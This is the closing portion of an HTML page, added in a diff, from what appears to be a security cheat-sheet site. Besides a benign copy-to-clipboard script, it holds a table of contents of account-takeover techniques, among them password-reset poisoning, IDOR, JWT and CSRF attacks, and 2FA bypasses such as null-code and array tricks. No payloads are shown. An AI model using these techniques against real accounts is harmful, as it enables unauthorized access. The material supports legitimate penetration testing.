+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#account-takeover">Account Takeover</a>
+      <ul>
+        <li><a href="#password-reset-feature">Password Reset Feature</a>
+          <ul>
+            <li><a href="#password-reset-token-leak-via-referrer">Password Reset Token Leak Via Referrer</a></li>
+            <li><a href="#account-takeover-through-password-reset-poisoning">Account Takeover Through Password Reset Poisoning</a></li>
+            <li><a href="#password-reset-via-email-parameter">Password Reset Via Email Parameter</a></li>
+            <li><a href="#idor-on-api-parameters">IDOR on API Parameters</a></li>
+            <li><a href="#weak-password-reset-token">Weak Password Reset Token</a></li>
+            <li><a href="#leaking-password-reset-token">Leaking Password Reset Token</a></li>
+            <li><a href="#password-reset-via-username-collision">Password Reset Via Username Collision</a></li>
+            <li><a href="#account-takeover-due-to-unicode-normalization-issue">Account takeover due to unicode normalization issue</a></li>
+          </ul>
+        </li>
+        <li><a href="#account-takeover-via-cross-site-scripting">Account Takeover Via Cross Site Scripting</a></li>
+        <li><a href="#account-takeover-via-http-request-smuggling">Account Takeover Via HTTP Request Smuggling</a></li>
+        <li><a href="#account-takeover-via-csrf">Account Takeover via CSRF</a></li>
+        <li><a href="#account-takeover-via-jwt">Account Takeover via JWT</a></li>
+        <li><a href="#2fa-bypasses">2FA Bypasses</a>
+          <ul>
+            <li><a href="#response-manipulation">Response Manipulation</a></li>
+            <li><a href="#status-code-manipulation">Status Code Manipulation</a></li>
+            <li><a href="#2fa-code-leakage-in-response">2FA Code Leakage in Response</a></li>
+            <li><a href="#js-file-analysis">JS File Analysis</a></li>
+            <li><a href="#2fa-code-reusability">2FA Code Reusability</a></li>
+            <li><a href="#lack-of-brute-force-protection">Lack of Brute-Force Protection</a></li>
+            <li><a href="#missing-2fa-code-integrity-validation">Missing 2FA Code Integrity Validation</a></li>
+            <li><a href="#csrf-on-2fa-disabling">CSRF on 2FA Disabling</a></li>
+            <li><a href="#password-reset-disable-2fa">Password Reset Disable 2FA</a></li>
+            <li><a href="#backup-code-abuse">Backup Code Abuse</a></li>
+            <li><a href="#clickjacking-on-2fa-disabling-page">Clickjacking on 2FA Disabling Page</a></li>
+            <li><a href="#enabling-2fa-doesnt-expire-previously-active-sessions">Enabling 2FA doesn&rsquo;t expire Previously active Sessions</a></li>
+            <li><a href="#bypass-2fa-with-null-or-000000">Bypass 2FA with null or 000000</a></li>
+            <li><a href="#bypass-2fa-with-array">Bypass 2FA with array</a></li>
+          </ul>
+        </li>
+        <li><a href="#todo">TODO</a></li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
